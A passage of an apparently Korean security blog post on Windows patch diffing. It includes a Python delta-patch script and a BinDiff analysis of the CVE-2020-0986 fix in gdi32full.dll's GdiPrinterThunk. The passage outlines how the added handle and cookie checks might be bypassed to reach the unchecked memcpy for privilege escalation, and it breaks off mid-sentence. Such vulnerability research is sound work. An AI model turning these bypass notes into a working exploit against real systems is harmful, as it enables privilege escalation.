&#xD328;&#xCE58;&#xB97C; &#xD558;&#xBA74; 329 &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xACE0; &#xAD6C;&#xD55C; &#xB450; &#xAC1C;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB514;&#xD551; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2011.png" alt="Untitled"></p><p>&#xB2E4;&#xC74C;&#xC740; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xB97C; &#xD558;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC9DC;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. msdelta.dll&#xC758; ApplyDeltaB&#xB294; MS&#xC5D0;&#xC11C; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Delta Patch API&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xBCF8; &#xB370;&#xC774;&#xD130;&#xC640; &#xB378;&#xD0C0; &#xB370;&#xC774;&#xD130;, &#xC0DD;&#xC131;&#xD560; &#xACB0;&#xACFC; &#xB370;&#xC774;&#xD130;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xC6D0;&#xBCF8; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB378;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD328;&#xCE58;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xACB0;&#xACFC; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC501;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2012.png" alt="Untitled"></p><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC911; &#xD328;&#xCE58;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xB294; &#xD568;&#xC218; <code>apply_patches</code>&#xC5D0;&#xC11C;&#xB294; differential&#xC758; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCCD0;&#xC640; CRC&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xD328;&#xCE58;&#xB97C; <code>ApplyDeltaB</code>&#xD568;&#xC218;&#xB85C; input &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC801;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/28-1.png" alt="28-1.png"></p><p>&#xC57D; 100&#xC904; &#xC815;&#xB3C4; &#xB418;&#xB294; &#xC9E7;&#xC740; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xB97C; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sql">from ctypes import (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)import zlibimport sysimport base64import hashlibimport argparseimport struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = 0x00000000DELTA_APPLY_FLAG_ALLOW_PA19 = 0x00000001<span class="hljs-comment"># struct</span>class DELTA_INPUT(LittleEndianStructure):class U1(Union):_fields_ = [(&apos;lpcStart&apos;, wintypes.LPVOID),(&apos;lpStart&apos;, wintypes.LPVOID)]_anonymous_ = (&apos;u1&apos;,)_fields_ = [(&apos;u1&apos;, U1),(&apos;uSize&apos;, c_size_t),(&apos;Editable&apos;, wintypes.BOOL)]class DELTA_OUTPUT(LittleEndianStructure):_fields_ = [(&apos;lpStart&apos;, wintypes.LPVOID),(&apos;uSize&apos;, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastErrordef apply_patches(buf, buf_len, patch_path):<span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(patch_path, <span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> p:<span class="hljs-keyword">patch</span> = p.read()<span class="hljs-keyword">if</span> <span class="hljs-keyword">patch</span>[:<span class="hljs-number">2</span>] != b<span class="hljs-string">&quot;PA&quot;</span>:patch_offset = patch.find(b<span class="hljs-string">&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(<span class="hljs-keyword">patch</span>[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = <span class="hljs-keyword">patch</span>[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = <span class="hljs-keyword">cast</span>(patch_contents, wintypes.LPVOID)d_dest.uSize = <span class="hljs-keyword">len</span>(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span><span class="hljs-keyword">status</span> = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> <span class="hljs-keyword">status</span> == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+<span class="hljs-keyword">str</span>(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:ap = argparse.ArgumentParser()<span class="hljs-keyword">mode</span> = ap.add_mutually_exclusive_group(<span class="hljs-keyword">required</span>=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, <span class="hljs-keyword">help</span>=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, <span class="hljs-keyword">action</span>=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-keyword">default</span>=<span class="hljs-literal">False</span>, <span class="hljs-keyword">help</span>=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-keyword">required</span>=<span class="hljs-literal">True</span> , <span class="hljs-keyword">help</span>=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, <span class="hljs-keyword">required</span>=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&apos;+&apos;</span>, <span class="hljs-keyword">help</span>=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(args.input, <span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = <span class="hljs-keyword">len</span>(inbuf)buf = <span class="hljs-keyword">cast</span>(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> <span class="hljs-keyword">patch</span> <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, <span class="hljs-keyword">patch</span>)alloc_list.append(buf)output_buf = <span class="hljs-keyword">bytes</span>((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(args.output, <span class="hljs-string">&apos;wb&apos;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)<span class="hljs-keyword">hash</span> = hashlib.sha256(output_buf)print(<span class="hljs-keyword">str</span>(<span class="hljs-keyword">len</span>(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2013.png" alt="Untitled"></p><p>&#xC774;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD328;&#xCE58;&#xB97C; &#xD558;&#xB294;&#xB370;, &#xBA3C;&#xC800; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xBD80;&#xD130; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Windows&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xD6C4; <code>C:\Windows\WinSxS</code> &#xD3F4;&#xB354;&#xC5D0; differential &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBC31;&#xC5C5;&#xD558;&#xB294;&#xB370;,  differential &#xD30C;&#xC77C;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xC791;&#xC73C;&#xB2C8; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xBC31;&#xC5C5;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xC774;&#xD6C4;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xB2E4;&#xC2DC; &#xB864;&#xBC31;&#xD558;&#xB294; &#xB4F1; &#xBC84;&#xC804; &#xAD00;&#xB9AC;&#xAC00; &#xC6A9;&#xC774;&#xD55C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xC758; &#xC7A5;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; <code>gdi32full.dll</code> &#xBC84;&#xC804;&#xC774; 264&#xB2C8;&#xAE4C; WinSxS &#xD3F4;&#xB354;&#xC5D0; &#xC788;&#xB294; 264 &#xBC84;&#xC804;&#xC758; reverse differential &#xD30C;&#xC77C;&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xD558;&#xBA74; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC758; gdi32full.dll&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD328;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; input&#xC73C;&#xB85C; 264 &#xBC84;&#xC804;&#xC758; <code>gdi32full.dll</code>&#xC744; &#xC8FC;&#xACE0; &#xD328;&#xCE58;&#xD30C;&#xC77C; input&#xC73C;&#xB85C; 264 &#xBC84;&#xC804;&#xC758; reverse differntial &#xD30C;&#xC77C;&#xC744; &#xC8FC;&#xBA74; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xAC00; &#xB41C; <code>gdi32full_1.dll</code>&#xC774; &#xC0DD;&#xC131;&#xB418;&#xC8E0;. &#xC0DD;&#xC131;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xBC84;&#xC804;&#xC744; &#xD30C;&#xC77C; &#xC18D;&#xC131;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; 1 &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB864;&#xBC31;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xACB0;&#xACFC; &#xD30C;&#xC77C;&#xC758; &#xD574;&#xC2DC;&#xB3C4; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294;&#xB370;, &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC758; manifest&#xC5D0;&#xC11C; &#xAC01; &#xBC84;&#xC804;&#xC758; &#xD574;&#xC2DC;&#xAC12;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xBA74; &#xC815;&#xC0C1; &#xD328;&#xCE58;&#xAC00; &#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2014.png" alt="Untitled"></p><p>&#xBC29;&#xAE08; &#xAD6C;&#xD55C; 1 &#xBC84;&#xC804;&#xC758; <code>gdi32full_1.dll</code>&#xC744; &#xC544;&#xAE4C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; 329 &#xBC84;&#xC804;&#xC758; forward differential &#xD30C;&#xC77C;&#xB85C; &#xB2E4;&#xC2DC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;. &#xBC29;&#xBC95;&#xC740; reverse differential&#xACFC; &#xCC28;&#xC774;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xD328;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC8FC;&#xBA74; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; 329 &#xBC84;&#xC804;&#xC758; <code>gdi32full_329.dll</code>&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2015.png" alt="Untitled"></p><p>&#xBD84;&#xC11D;&#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBAA8;&#xB450; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; &#xC774; &#xB450; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; Diffing &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. Binary Diffing&#xC740; git diff&#xB97C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xC774;&#xD574;&#xAC00; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;. Git diff&#xB294; &#xCEE4;&#xBC0B; &#xC804;&#xACFC; &#xCEE4;&#xBC0B; &#xD6C4; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC758; &#xBCC0;&#xACBD;&#xC810;&#xC744; &#xD55C;&#xB208;&#xC5D0; &#xC54C;&#xC544;&#xBCFC; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; &#xADF8;&#xB300;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC801;&#xC6A9;&#xC2DC;&#xD0A8; &#xAC83;&#xC774; Binary Diffing&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2016.png" alt="Untitled"></p><p>Binary Diffing&#xC740; 2&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBE44;&#xAD50; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAE30;&#xC220;&#xB85C; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD569;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A4; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00; &#xD639;&#xC740; &#xC0AD;&#xC81C;&#xB418;&#xACE0; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB97C; &#xBCF4;&#xC5EC;&#xC8FC;&#xBA70; &#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; BinDiff&#xB77C;&#xB294; IDA&#xC758; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xAE30;&#xBC18; &#xD234;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2017.png" alt="Untitled"></p><p>BinDiff&#xB294; ida database &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; BinDiff&#xB97C; &#xC124;&#xCE58;&#xD560; &#xB54C; &#xAC19;&#xC774; &#xC124;&#xCE58;&#xB418;&#xB294; BinExport&#xB85C; IDA&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xCD94;&#xCD9C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. 264 &#xBC84;&#xC804;&#xACFC; 329 &#xBC84;&#xC804;&#xC758; <code>gdi32full.dll</code> &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xAC01;&#xAC01; &#xCD94;&#xCD9C;&#xD558;&#xACE0; BinDiff&#xC758; Primary Source&#xC640; Secondary Source&#xC5D0; &#xAC01;&#xAC01; &#xC9C0;&#xC815;&#xD574; &#xB514;&#xD551; &#xBD84;&#xC11D;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2018.png" alt="Untitled"></p><p>&#xB514;&#xD551; &#xACB0;&#xACFC;&#xCC3D;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC774; &#xB098;&#xC624;&#xB294;&#xB370;, Similarity&#xB294; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xB450; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xC720;&#xC0AC;&#xB3C4;&#xB97C; &#xD568;&#xC218;&#xBCC4;&#xB85C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC720;&#xC0AC;&#xB3C4;&#xAC00; &#xB192;&#xC744;&#xC218;&#xB85D; 1&#xC5D0;&#xAC00;&#xAE4C;&#xC6CC;&#xC9C0;&#xBA70; &#xB0AE;&#xC744;&#xC218;&#xB85D; 0&#xC5D0; &#xAC00;&#xAE4C;&#xC6CC;&#xC838; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. CVE-2020-0986&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD588;&#xB358; &#xD568;&#xC218;&#xC778; <code>GdiPrinterThunk</code>&#xC758; &#xC720;&#xC0AC;&#xB3C4;&#xAC00; 0.6 &#xC778;&#xAC78;&#xB85C; &#xBD10;&#xC11C; &#xD328;&#xCE58;&#xAC00; &#xAF64; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;. <code>GdiPrinterThunk</code>&#xB97C; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2019.png" alt="Untitled"></p><p>&#xC67C;&#xCABD; primary&#xAC00; &#xD328;&#xCE58; &#xC804; <code>gdi32full_264.dll</code>&#xC774;&#xACE0; &#xC624;&#xB978;&#xCABD; secondary&#xAC00; &#xD328;&#xCE58;&#xB41C; <code>gdi32full_329.dll</code>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;&#xB97C; &#xBCF4;&#xC2DC;&#xBA74; &#xC67C;&#xCABD;&#xC5D0;&#xB294; &#xC5C6;&#xB294; &#xD68C;&#xC0C9; &#xCF54;&#xB4DC; &#xBE14;&#xB7ED;&#xC774; &#xC624;&#xB978;&#xCABD;&#xC5D0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xD328;&#xCE58; &#xC804;&#xC5D0;&#xB294; &#xC5C6;&#xB358; &#xC0C8;&#xB85C;&#xC6B4; &#xD568;&#xC218;&#xB97C; call &#xD558;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>bindiff&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xCD94;&#xAC00;&#xB41C; &#xD568;&#xC218;&#xB97C; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; IDA&#xB85C; &#xC790;&#xC138;&#xD788; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2020.png" alt="Untitled"></p><p>329&#xBC84;&#xC804;&#xC758; opcode 6d &#xB8E8;&#xD2F4;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xBA3C;&#xC800; <code>FindDriverForCookie</code> &#xD568;&#xC218;&#xAC00; &#xCD94;&#xAC00;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC720;&#xD6A8;&#xD55C; &#xD504;&#xB9B0;&#xD130; &#xD578;&#xB4E4; &#xD655;&#xC778;&#xC5D0; &#xB354;&#xD574; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xCFE0;&#xD0A4;&#xAC00; &#xC788;&#xB294;&#xC9C0;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xC774;&#xC804; &#xD328;&#xCE58; &#xBC84;&#xC804;&#xCC98;&#xB7FC; &#xC9C1;&#xC811; &#xC8FC;&#xC18C; &#xC9C0;&#xC815; &#xBC29;&#xC2DD;&#xC774; &#xC544;&#xB2CC; &#xD3EC;&#xC778;&#xD130; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD574; LPC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xC73C;&#xBA70; &#xADF8;&#xC5D0; &#xB530;&#xB77C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xB294; <code>UMPDPointerFromOffset</code>&#xACFC; <code>UMPDStringPointerFromOffset</code> &#xD568;&#xC218;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xACE0; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>memcpy</code>&#xC5D0;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xB2E4;&#xB978; &#xAC80;&#xC0AC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xCD94;&#xAC00;&#xB41C; &#xD568;&#xC218;&#xB9CC; &#xC6B0;&#xD68C;&#xD558;&#xBA74; &#xAE30;&#xC874;&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2021.png" alt="Untitled"></p><p>&#xBA3C;&#xC800; &#xCD94;&#xAC00;&#xB41C; <code>FindDriverForCookie</code>&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xAE30;&#xC874; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xB370; &#xB354;&#xD574; &#xCFE0;&#xD0A4;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2022.png" alt="Untitled"></p><p><code>FindDriverForCookie</code>&#xB294; opcode 6A &#xB8E8;&#xD2F4;&#xC778; <code>INDEX_LoadDriver</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. Opcode 6A&#xC758; <code>bAddPrinterHandle</code> &#xD568;&#xC218;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD799;&#xC5D0; &#xD504;&#xB9B0;&#xD130; &#xD578;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; &#xD504;&#xB9B0;&#xD130; &#xD578;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xACE0; <code>FindDriverForCookie</code>&#xC640; <code>FindPrinterHandle</code>&#xD568;&#xC218;&#xC758; &#xD504;&#xB9B0;&#xD130; &#xD578;&#xB4E4; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/08/l0ch/windows_1-day_patch_diffing/Untitled%2023.png" alt="Untitled"></p><p>&#xB450; &#xBC88;&#xC9F8;&#xB85C; &#xCD94;&#xAC00;&#xB41C; <code>UMPDPointerFromOffset</code> &#xBC0F; <code>UMPDStringPointerFromOffset</code>&#xC785;&#xB2C8;&#xB2E4;.  &#xADF8;&#xB7F0;&#xB370;.. &#xBD84;&#xC11D;&#xD558;&#xB2E4;&#xAC00; &#xBB38;&#xC81C;&#xAC00; &#xD558;&#xB098; &#xC0DD;&#xACBC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C;&#xBCF4;&#xB41C; &#xCDE8;&#xC57D;&#xC810; &#xBCF4;&#xACE0;&#xC11C;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD55C; &#xC774; &#xBC84;&#xC804;&#xC5D0;&#xB294; &#xD06C;&#xAE30; &#xAC80;&#xC0AC;&#xAC00; <code>0x7FFFFFFF</code> &#xC5EC;&#xC11C; bypass&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370; &#xB9C9;&#xC0C1; &#xB72F;&#xC5B4;&#xBCF4;&#xB2C8;&#xAE4C; &#xC774;&#xBBF8; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xB41C; 